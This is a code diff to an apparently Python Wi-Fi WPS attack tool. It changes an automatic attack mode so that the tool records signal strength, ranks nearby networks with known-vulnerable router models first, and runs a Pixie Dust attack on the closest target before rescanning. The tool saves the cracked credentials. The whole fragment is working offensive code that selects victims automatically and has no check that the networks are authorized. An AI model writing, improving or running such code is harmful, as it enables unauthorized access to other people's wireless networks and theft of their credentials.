@@ -1198,7 +1198,7 @@ def auto_attack_mode(args):
                 time.sleep(30)
                 continue
 
-            # Prioritize networks: green, then white
+            # Prioritize networks: green, then white (maintaining signal strength order within each category)
             green_targets = []
             white_targets = []
 
@@ -1209,13 +1209,18 @@ def auto_attack_mode(args):
                 if network['WPS locked']:
                     continue
                 
-                target_info = {'bssid': network['BSSID'], 'essid': network.get('ESSID', 'HIDDEN')}
+                target_info = {
+                    'bssid': network['BSSID'], 
+                    'essid': network.get('ESSID', 'HIDDEN'),
+                    'level': network['Level']  # Preserve signal strength for prioritization
+                }
 
                 if model in vuln_list:
                     green_targets.append(target_info)
                 else:
                     white_targets.append(target_info)
 
+            # Combine prioritized targets (green first, then white) - already sorted by signal strength
             prioritized_targets = green_targets + white_targets
             
             if not prioritized_targets:
@@ -1223,16 +1228,18 @@ def auto_attack_mode(args):
                 time.sleep(30)
                 continue
 
-            for target in prioritized_targets:
-                print(f"[*] Attacking {target['essid']} ({target['bssid']})")
-                companion = Companion(args.interface, args.write, print_debug=args.verbose, bssid=target['bssid'], save_location=args.location, attempt_timeout=args.attempt_time)
-                if companion.single_connection(bssid=target['bssid'], pixiemode=True, showpixiecmd=args.show_pixie_cmd, pixieforce=args.pixie_force):
-                    print(f"[+] Successfully attacked {target['essid']}. Credentials saved.")
-                    stored_networks.add(target['bssid'])
-                else:
-                    print(f"[-] Attack on {target['essid']} failed.")
-                # companion.cleanup()
-                time.sleep(5) # Brief pause between attacks
+            # Attack only the first (highest priority/closest) target, then rescan
+            target = prioritized_targets[0]
+            print(f"[*] Attacking {target['essid']} ({target['bssid']}) [Signal: {target['level']} dBm]")
+            companion = Companion(args.interface, args.write, print_debug=args.verbose, bssid=target['bssid'], save_location=args.location, attempt_timeout=args.attempt_time)
+            if companion.single_connection(bssid=target['bssid'], pixiemode=True, showpixiecmd=args.show_pixie_cmd, pixieforce=args.pixie_force):
+                print(f"[+] Successfully attacked {target['essid']}. Credentials saved.")
+                stored_networks.add(target['bssid'])
+            else:
+                print(f"[-] Attack on {target['essid']} failed.")
+            # companion.cleanup()
+            print("[*] Rescanning for networks to prioritize closer targets...")
+            time.sleep(5) # Brief pause before rescanning
 
         except KeyboardInterrupt:
             print("\n[!] Auto-attack mode stopped by user.")
